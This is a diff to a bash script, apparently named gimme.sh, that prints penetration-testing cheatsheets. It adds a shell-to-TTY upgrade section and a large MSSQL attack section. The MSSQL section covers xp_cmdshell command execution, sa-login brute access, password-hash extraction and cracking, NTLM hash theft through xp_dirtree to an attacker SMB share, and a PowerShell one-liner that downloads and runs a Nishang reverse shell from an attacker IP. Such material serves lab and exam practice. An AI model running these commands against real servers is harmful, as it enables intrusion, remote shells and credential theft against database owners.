@@ -23,7 +23,26 @@ BPurple='\033[1;35m'      # Purple
 BCyan='\033[1;36m'        # Cyan
 BWhite='\033[1;37m'       # White
 
+function int-tty()
+{
+			echo -e "$BWhite====================== int-tty ========================="
+			echo -e "[$BGreen INTERACTIVE TTYS SHELL $White]"
+			echo -e "$Blue https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ $White"
+			echo -e "$White python -c 'import pty;pty.spawn(\"/bin/bash\")'" 
+			echo -e "$White python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" 
+			echo -e "$White echo os.system('/bin/bash') $Cyan # ishell bypass" 
+			echo -e "$White /bin/sh -I $Cyan" 
+			echo -e ""
+			echo -e "$White ctrl-z"
+			echo -e "$White echo \$TERM"  
+			echo -e "$White stty -a"  
+			echo -e "$White stty raw -echo"
+			echo -e "$White fg"  
+			echo -e "$White reset"  
+			echo -e "$White stty rows$Yellow 61$White columns$Yellow 205"
 
+			echo -e "$BWhite===================================================+++=="
+}
 
 function rev()
 {
@@ -323,7 +342,7 @@ function tftp()
 			echo -e "$Cyan # vi direcotry.txt and remove . and .."
 			echo -e "$White for file in \`cat directory.txt\`; do echo -e \"get \$file\\\nquit\\\n\"|tftp $BYellow$1 $2$White; done"
 			echo -e "$BPurple Read all files $White"
-			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan# Include .(dot)file and recursive $White"
+			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan # Include .(dot)file and recursive $White"
 			echo -e "$white for i in *; do echo \">> \$i <<\" && cat \$i; done $Cyan# No .(dot) file and not recursive $White"
 
 			echo -e "$BWhite====================================================="
@@ -423,11 +442,130 @@ function smb()
 			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan# Include .(dot)file and recursive $White"
 			echo -e "$white for i in *; do echo \">> \$i <<\" && cat \$i; done $Cyan# No .(dot) file and not recursive $White"
 
-
-
-
 			echo -e "$BWhite====================================================="
 }
+
+function mssql()
+{
+			echo -e "$BWhite====================== mssql ========================="
+			echo -e "[$BGreen MS SQL $White]"
+			echo -e "$Blue http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/"
+			echo -e "$BBlue nmap$White"
+			echo -e "$BPurple Enumeration$White"
+			if [ "$2" != "" ]; then
+					echo -e "$White nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p $2 $1"
+
+			else
+					echo -e "$White nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $1"
+			fi
+
+			echo -e "$BPurple Command Execution $White"
+			if [ "$2" != "" ]; then
+					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p$2 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"whoami\""
+			else
+					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"whoami\""
+			fi
+			echo -e ""
+			echo -e "$BBlue sqsh$White"
+			
+			echo -e "$BPurple Connection$White"
+			echo -e "$White sqsh -S $1 -U username -P password" 
+			echo -e "$Cyan >sqsh -S 10.11.1.31 -U sa -P poiuytrewq" 
+
+			echo -e "$BPurple Find Version$White"
+
+			echo -e "$White 1> select @@version"
+			echo -e "$White 2> go"
+
+			echo -e "$BPurple Determine current user$White"
+			echo -e "$White 1> select suser_sname()"
+			echo -e "$White 2> go"
+
+			echo -e "$BPurple Find database names$White"
+			echo -e "$White 1>SELECT name FROM master..sysdatabases"
+			echo -e "$White 2>go"
+			echo -e "$White 1>SELECT name FROM master.dbo.sysdatabases"
+			echo -e "$White 2>go"
+
+			echo -e "$BPurple Find table names$White"
+			echo -e "$White 1>SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES"
+			echo -e "$Cyan 1>SELECT * FROM master.INFORMATION_SCHEMA.TABLES # master database" 
+			echo -e "$White 2>go"
+			echo -e "$White 1>SELECT name FROM master..sysobjects WHERE xtype = 'U'"
+			echo -e "$White 2>go"
+
+			echo -e "$BPurple Find column names$White"
+			echo -e "$White 1>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table_name')"
+			echo -e "$White 2>go"
+
+			echo -e "$BPurple Extract data$White"
+			echo -e "$White 1>SELECT colum_name_1 FROM table_name1"
+			echo -e "$White 2>go"
+
+
+			echo -e "$BPurple Determine users with sysadmin rights"
+			echo -e "$White select loginname from syslogins where sysadmin = 1"
+
+			echo -e "$BPurple Extract password hash$White"
+			echo -e "$White 1>select name, password_hash from master.sys.sql_logins"
+			echo -e "$White 2>go"
+
+			echo -e "$BPurple Crack password hash$White"
+			echo -e "$White john mssqlHash.txt"
+
+			echo -e "$BPurple Command Execution"
+			echo -e "$White 1>xp_cmdshell 'whoami'"
+			echo -e "$White 2>go"
+
+			echo -e "$Cyan If above does work, run the command below"
+
+			echo -e "$White 1> EXEC SP_CONFIGURE 'show advanced options',1"
+			echo -e "$White 2> reconfigure" 
+			echo -e "$White 3> go"
+
+			echo -e "$White 1> EXEC SP_CONFIGURE 'xp_cmdshell',1"
+			echo -e "$White 2> reconfigure" 
+			echo -e "$White 3> go"
+
+			echo -e "$Cyan Run commands like below"
+			echo -e "$White 1>xp_cmdshell 'dir C:\'"
+			echo -e "$White 2>go"
+
+			echo -e "$BPurple Reverse Shell Command Execution"
+			echo -e "$White (Kali T1) cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 ."
+			echo -e "$White (Kali T1) mv Invoke-PowerShellTcp.ps1 shell.ps1"
+			echo -e "$Cyan Add the following at the end of shell.ps1"
+			echo -e "$White Invoke-PowerShellTcp -Reverse -IPAddress 192.168.142.141 -Port 1234"
+			echo -e "$White (Kali T2) sudo python3 -m http.server 80"
+			echo -e "$White (Kali T3) nc -nvlp 1234"
+			echo -e "$White 1>xp_cmdshell \"powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')\""
+			echo -e "$White 2>go"
+
+			 echo -e "$White (Kali T3) cmd /c \"systeminfo\""
+
+			echo -e ""
+			echo -e "$BBlue mssqlclient.py$White"
+			echo -e "$BPurple Connection"
+			echo -e "$White mssqlclient.py username:password@$1 $Cyan # For sa or local user"
+			echo -e "$White mssqlclient.py  -db volume -windows-auth DOMAIN/USERNAME:PASSWORD@$1$Cyan # Recommended when using Domain Credentials"
+			echo -e "$Cyan Use the same sql commands as in sqsh"
+
+			echo -e "$BPurple Steal NTLM hash"
+			echo -e "$White sudo smbserver.py -smb2support smb ."
+			echo -e "$White SQL> exec master..xp_dirtree '\\192.168.142.141\smb\'" # Steal the NTLM hash, crack it with john or hashcat
+			echo -e "$white john mssqlHash.txt"
+
+			echo -e "$BPurple Eable Command Execution"
+			echo -e "$White SQL> enable_xp_cmdshell"
+			echo -e "$BPurple Command Execution"
+			echo -e "$White SQL> xp_cmdshell whoami /all"
+			echo -e "$White SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.142.141/shell.ps1\") | powershell -noprofile'"
+
+
+
+			echo -e "$BWhite===================================================+++=="
+}
+
 
 function validate_ip()
 {
@@ -435,7 +573,7 @@ function validate_ip()
 		then
   			:
 		else
-				 	echo -e "Invalid RHOST or RPORT Value !!!"
+				 	echo -e "Invalid RHOST!!!"
 			exit
 		fi
 }
@@ -472,6 +610,8 @@ function validate_url()
 if [ $# -lt 1 ]
 then
 			echo -e "$BWhite====================== GimmeGimme ================================"
+			echo -e "$BGreen	--int-tty$BWhite 		: Print Reverse Shell Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --int-tty"
 		 	echo -e "$BGreen	--rev-shell$BWhite 	: Print Reverse Shell Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
 		 	echo -e "$BGreen	--file-transfer$BWhite : Print File Transfer Cheatsheet"
@@ -484,13 +624,25 @@ then
 		 	echo -e "			Syntax: gimme.sh --ftp RHOST [RPORT]"
 			echo -e "$BGreen	--tftp $BWhite 		: Print tftp Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --tftp RHOST [RPORT]"
-			echo -e "$BGreen	--smb $BWhite 		: Print tftp Cheatsheet"
+			echo -e "$BGreen	--smb $BWhite 		: Print smb Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --smb //RHOST/dir [RPORT]"
+			echo -e "$BGreen	--mssql $BWhite 		: Print mssql Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --mssql RHOST [RPORT]"
+			echo -e "$BGreen	--mssql $BWhite 		: Print mysql Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --mysql RHOST [RPORT]"
 		 	echo -e "$BWhite=================================================================="
 	exit
 fi
 
 case $1 in
+	"--int-tty")
+		if [ $# -lt 1 ]
+		then
+				 	echo -e "Syntax: gimme.sh --int-tty"
+			exit
+		fi
+		int-tty
+	;;
 	"--rev-shell")
 		if [ $# -lt 4 ]
 		then
@@ -570,6 +722,20 @@ case $1 in
 			exit
 		fi
 		smb $2 $3
+	;;
+	"--mssql")
+
+		if [ $# -lt 2 ] 
+		then
+				 	echo -e "Syntax: gimme.sh --mssql RHOST [RPORT]"
+			exit
+		fi
+		validate_ip $2
+		if [ $3 != "" ] 
+		then
+					validate_port $3 
+		fi
+		mssql $2 $3
 	;;
 
 	*)
